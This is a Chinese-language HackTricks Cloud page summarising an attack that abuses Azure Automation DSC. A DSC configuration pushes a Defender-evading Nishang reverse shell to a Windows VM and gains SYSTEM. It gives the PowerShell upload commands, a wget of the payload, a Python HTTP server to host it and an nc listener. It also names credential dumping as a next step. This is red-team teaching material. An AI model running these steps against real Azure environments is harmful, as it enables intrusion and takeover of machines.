# Az - State Configuration RCE

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[NFT](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

**查看完整文章：[https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### 远程服务器（C2）基础设施准备和步骤摘要

#### 概述
该过程涉及设置远程服务器基础设施，用于托管一个修改过的Nishang `Invoke-PowerShellTcp.ps1`有效载荷，命名为`RevPS.ps1`，旨在绕过Windows Defender。有效载荷从IP为`40.84.7.74`的Kali Linux机器上的简单Python HTTP服务器提供。操作通过以下几个步骤执行：

#### 步骤1 — 创建文件
- **所需文件：** 需要两个PowerShell脚本：
1. `reverse_shell_config.ps1`：一个期望状态配置（DSC）文件，用于获取和执行有效载荷。可从[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1)获取。
2. `push_reverse_shell_config.ps1`：一个用于将配置发布到虚拟机的脚本，可在[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1)获取。
- **定制：** 这些文件中的变量和参数必须根据用户特定的环境进行定制，包括资源名称、文件路径和服务器/有效载荷标识符。

#### 步骤2 — 压缩配置文件
- 将`reverse_shell_config.ps1`压缩成`.zip`文件，使其准备好传输到Azure存储账户。
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### 步骤 3 — 设置存储上下文 & 上传
- 使用 Azure 的 Set-AzStorageBlobContent 命令，将压缩的配置文件上传到预定义的 Azure 存储容器 azure-pentest。
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### 步骤 4 — 准备 Kali Box
- Kali 服务器从 GitHub 仓库下载 RevPS.ps1 负载。
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- 脚本已编辑以指定目标 Windows VM 和反向 shell 的端口。

#### 步骤 5 — 发布配置文件
- 执行配置文件，导致反向 shell 脚本部署到 Windows VM 上指定的位置。

#### 步骤 6 — 托管 Payload 和设置监听器
- 启动 Python SimpleHTTPServer 来托管 Payload，并启动 Netcat 监听器以捕获传入连接。
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- 计划任务执行有效载荷，实现了SYSTEM级别的特权。

#### 结论

这个过程的成功执行为进一步行动打开了许多可能性，比如凭据转储或将攻击扩展到多个虚拟机。该指南鼓励在Azure Automation DSC领域继续学习和创造。

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
